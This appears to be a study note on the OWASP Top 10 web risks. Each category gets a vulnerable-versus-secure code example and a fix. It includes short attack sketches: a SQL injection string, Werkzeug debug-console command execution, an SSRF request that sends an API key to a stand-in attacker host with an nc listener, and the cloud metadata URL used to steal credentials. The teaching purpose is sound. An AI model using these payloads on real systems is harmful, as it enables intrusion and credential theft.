---
title: "2.2 OWASP Top 10 Masterclass"
aliases: ["OWASP Top 10", "1. Broken Access Control", "2. Cryptographic Failures", "3. Injection", "4. Insecure Design", "5. Security Misconfiguration", "6. Vulnerable and Outdated Components", "7.  Identification and Authentication Failures", "8.  Software and Data Integrity Failures", "9.  Security Logging and Monitoring Failures", "10.  Server-Side Request Forgery (SSRF)"]
tags:
  - tree/appsec
  - cyber/web/owasp
  - type/concept
  - difficulty/medium
  - level/apprentice
Domain:
  - "[[Standards & API]]"
Color: "#911EB4"
---

# 🔟 2.2 OWASP Top 10 Masterclass

> [!abstract] The Masterclass
> The **OWASP Top 10** is the industry-standard catalogue of the most critical web application risks, ranked by prevalence and impact from real breach data. This chapter is the *framework* — each category explained with its root cause, a vulnerable-vs-secure example, an exploitation sketch, and the defensive fix. The *hands-on exploitation* lives in **Web Exploitation**; the *API-specific* variants in **API Security**. **`#level/apprentice`**

> [!warning] Authorized Vulnerability-Assessment context
> This catalogue is a **defensive architecture testing** reference. Each entry is framed as "here is the weakness, here is how an authorized assessor demonstrates it, here is how you remediate it."

> [!tip] Chapter Map
> **** · **** · **** · **** · **** · **** · **** · **** · **** · ****

---

## A01 Broken Access Control

**#1 by prevalence.** Access control enforces *what an authenticated user is allowed to do*. It's **broken** when a user can act outside their intended permissions — the gap between **authentication** ("who are you?") and **authorization** ("what may you do?").

Failure modes an assessor tests:
- **Horizontal** — reach another user's data at the same privilege level (**IDOR**).
- **Vertical** — reach higher-privilege functions (a normal user hitting `/admin`).
- **Forced browsing** — navigate straight to a protected URL that's merely *unlinked*, not *protected*.
- **Parameter/method tampering** — `?admin=true`, or a `DELETE` where only `GET` was expected.

The canonical case is **IDOR (Insecure Direct Object Reference)** — the app exposes an object identifier and trusts it:
```
https://bank.thm/account?id=111111     ← my account
https://bank.thm/account?id=222222     ← change the id → someone else's account
```
If the server returns account `222222` without checking it belongs to *me*, that's broken access control. Full exploitation: **Web Exploitation (IDOR)**; the API-native form is **BOLA**.

> **Secure design:** enforce authorization **server-side on every request**, keyed to the session identity — never trust a client-supplied ID or hidden field. **Deny by default**, use indirect/unpredictable references, centralise the checks (not scattered per-controller), and log access-control failures (****).

---

## A02 Cryptographic Failures

Formerly "Sensitive Data Exposure." Failures in protecting data **in transit** and **at rest**: no/weak TLS, broken algorithms (MD5, SHA1, DES, ECB mode), hard-coded keys, and — the most common — **fast, unsalted password hashes**.

```python
# ❌ Vulnerable — a fast, unsalted hash (crackable at billions/sec on a GPU)
import hashlib
stored = hashlib.md5(password.encode()).hexdigest()

# ✅ Secure — a slow, salted, memory-hard KDF
import bcrypt
stored = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
# verify:
bcrypt.checkpw(attempt.encode(), stored)
```
Why it matters: once a DB is dumped, MD5 password hashes fall to `hashcat` in minutes against `rockyou.txt`; bcrypt/argon2 make the same crack economically infeasible. In transit, missing HSTS enables the `sslstrip` downgrade from **Secure Protocols**.

> **Secure design:** TLS 1.2+ everywhere with **HSTS**; a modern password KDF (**argon2id / bcrypt / scrypt**) with per-user salt; authenticated encryption (**AES-GCM**, never ECB) for data at rest; secrets in a vault or KMS, never in source or config committed to git.

---

## A03 Injection

Untrusted input is interpreted as **code/commands** by a downstream interpreter — SQL, OS shell, LDAP, template engines, NoSQL, XPath. The root cause is always identical: **data and code concatenated into one string.**
```php
// ❌ Vulnerable — user input becomes part of the SQL
$q = "SELECT * FROM users WHERE name = '$name'";
// Input:  name = ' OR '1'='1   → returns every row
// ✅ Secure — parameterised; the driver keeps data and code separate
$stmt = $pdo->prepare("SELECT * FROM users WHERE name = ?");
$stmt->execute([$name]);
```
This entire family — **SQLi**, **command injection**, **LDAP**, **SSTI**, **XXE** — is exploited hands-on in **Web Exploitation**. **Fix:** parameterisation/prepared statements, allow-list input validation, context-safe APIs (ORMs used correctly), and least-privilege interpreter accounts so a successful injection yields little.

---

## A04 Insecure Design

A *structural* flaw — the system is insecure **by design**, not by a coding bug. No amount of perfect implementation fixes a *missing* control. Examples: a password-reset flow with no rate limit; a checkout that trusts a client-supplied `price` field; a "security question" recoverable from public data; a workflow with no anti-automation.

The distinction from **** matters: misconfiguration is a control that *exists but is set wrong*; insecure design is a control that *was never there*. You can't patch your way out of it.

> **Secure design:** **threat-model** during design, write **abuse-cases** alongside use-cases ("how would an attacker misuse this?"), use established secure design patterns, enforce business-logic limits server-side, and build security requirements in from the start — shift left.

---

## A05 Security Misconfiguration

The system *could* have been secured but wasn't: default credentials, unnecessary features/ports/accounts enabled, verbose error messages/stack traces, missing [security headers](https://owasp.org/www-project-secure-headers/), permissive CORS, and — dangerously — **exposed debug interfaces**.

The 2015 **Patreon** breach came from an exposed **Werkzeug debug console** (reachable at `/console`, or auto-shown on an unhandled exception), which runs arbitrary Python:
```python
import os; print(os.popen("ls -l").read())     # RCE via a forgotten debugger
import os; os.popen("id").read()                 # confirm the web user
```
A single left-on `DEBUG=True` becomes remote code execution. Other staples: `admin/admin` on a mgmt panel, a directory listing exposing backups, or a stack trace revealing the framework, version, and file paths.

> **Secure design:** harden a **repeatable baseline** (infrastructure-as-code), disable debug/default accounts in production, minimise the feature/port surface, return **generic errors**, and ship the full set of security headers (CSP, HSTS, X-Content-Type-Options, X-Frame-Options).

---

## A06 Vulnerable and Outdated Components

Modern apps are built on hundreds of third-party libraries; you inherit every one of their CVEs. A single known-vulnerable dependency — Log4Shell (`log4j` CVE-2021-44228), an old jQuery, an unpatched Struts or CMS plugin — is often the whole breach.
```bash
npm audit            # Node
pip-audit            # Python
trivy image myapp    # container image CVEs
grype dir:.          # filesystem/SBOM scan
```
The challenge is *transitive* dependencies (a library your library uses) and *reachability* (is the vulnerable code path actually used?). Log4Shell was devastating precisely because a ubiquitous logging library, three dependencies deep, could be triggered by a crafted string in any logged field.

> **Secure design:** maintain a **Software Bill of Materials (SBOM)**, patch continuously (Dependabot/Renovate), remove unused dependencies, pin versions, and monitor CVE feeds for everything you ship.

---

## A07 Identification and Authentication Failures

Weaknesses in verifying *who* the user is: brute-forceable logins, weak/credential-stuffed passwords, predictable or non-rotated session tokens, and broken account-management logic.

Authentication issues an assessor probes:
- **Brute force / credential stuffing** — no lockout or rate limit on login; test with **hydra**.
- **Weak session cookies** — predictable/sequential IDs let an attacker set their own; no rotation after login enables **session fixation**.
- **Registration logic flaws** — e.g. **re-registration of an existing user** with a leading space (`" admin"`); if the app trims/collides names inconsistently, the second account can inherit the real `admin`'s context.

> **Secure design:** strong password policy, **account lockout / rate limiting** on login, ****MFA****, high-entropy session tokens **rotated on login**, canonicalise usernames, and secure the whole reset/recovery flow. JWT-specific failures: **Web Fundamentals (JWT Security)**.

---

## A08 Software and Data Integrity Failures

Trusting code or data whose **integrity you can't verify** — a category that grew with CI/CD and CDN-delivered dependencies (it covers software-supply-chain attacks like SolarWinds).

**Software integrity** — pulling a library from an external CDN with no integrity check. If the CDN (or the library's repo) is compromised, every visitor executes the injected code:
```html
<!-- ❌ No integrity check — trusts the CDN blindly -->
<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
<!-- ✅ Subresource Integrity: the browser runs it ONLY if the file's hash matches -->
<script src="https://code.jquery.com/jquery-3.6.1.min.js"
        integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ="
        crossorigin="anonymous"></script>
```

**Data integrity** — trusting client-tamperable data. Storing a raw `username` in a cookie lets a user rewrite it and impersonate anyone:

The fix is an integrity-protected token — a **JWT**, whose signature (keyed by a server-only secret) proves the payload wasn't altered:

But JWTs introduce their own integrity failure — the **`alg: none`** downgrade: set `alg` to `none`, drop the signature, and vulnerable libraries accept it, letting you forge `"admin":true`:

> **Secure design:** **SRI** for external scripts, **signed & verified** update/CI pipelines and container images, digital signatures on serialized data, and never trust client-side data for authorization. Full JWT attack set: **Web Fundamentals (JWT Security)**; deserialization: **Web Exploitation (Insecure Deserialisation)**.

---

## A09 Security Logging and Monitoring Failures

You can't respond to what you can't see. Missing or insufficient logging of authentication events, access-control failures, and high-value actions means breaches dwell undetected for months (industry median: **~200+ days**).

What *should* be logged: login success/failure, access-control denials, input-validation failures, and all high-value transactions — with enough context (who, what, when, from where) to reconstruct an attack, but **without** logging secrets/passwords/tokens themselves.

> **Secure design:** log security-relevant events with context; **forward off-host** to a tamper-resistant SIEM (so an attacker who owns the box can't erase the trail — mirrors **host logging**); alert on anomalies (spikes of failed logins, access-control denials, log-clearing); and rehearse incident response so the alerts actually get actioned.

---

## A10 Server-Side Request Forgery

**SSRF** coerces the *server* into making attacker-chosen requests — reaching internal services the attacker can't touch directly, because the request originates from inside the trust boundary.

Classic case — a `server`/`url` parameter the app forwards to:
```
https://mysite.com/sms?server=attacker.thm&msg=ABC
→ the server makes:  https://attacker.thm/api/send?msg=ABC   (leaking the API key)
```
```bash
nc -lvp 80      # catch the forwarded request (and any secrets/headers it carries)
```
SSRF escalates far beyond a leaked key: **enumerate internal networks/ports**, hit **cloud metadata** (`http://169.254.169.254/latest/meta-data/…`) to steal IAM credentials, reach internal admin panels, and interact with non-HTTP services (Redis, gopher://) for RCE. Full exploitation, including filter bypasses: **Web Exploitation (Server-Side Request Forgery (SSRF))**.

> **Secure design:** **allow-list** permitted destinations (not a deny-list of "bad" ones), block requests to internal/link-local ranges (`169.254.0.0/16`, RFC 1918), disable unused URL schemes, never reflect raw responses to the user, and require IMDSv2 on cloud metadata.

---

## Summary

You should now be able to:

- Name each of the OWASP Top 10 categories and state the mechanism behind it, not just its title.
- Recognise the highest-impact web risks — broken access control, cryptographic failures, injection and SSRF — in real code.
- State the primary control for each category and explain why it addresses the cause rather than the symptom.

## 🔗 Related Master Notes & Deep-Dives
- **2.3 Web Exploitation** — hands-on exploitation of these categories
- **2.1 Web Fundamentals** — HTTP, recon & JWT foundations
- **2.4 API Security** — the API Top 10 counterpart
- **1.6 Defensive Groundwork** · **Networking (Secure Protocols and Encryption)** — defensive controls
- [[Standards & API]] — domain hub
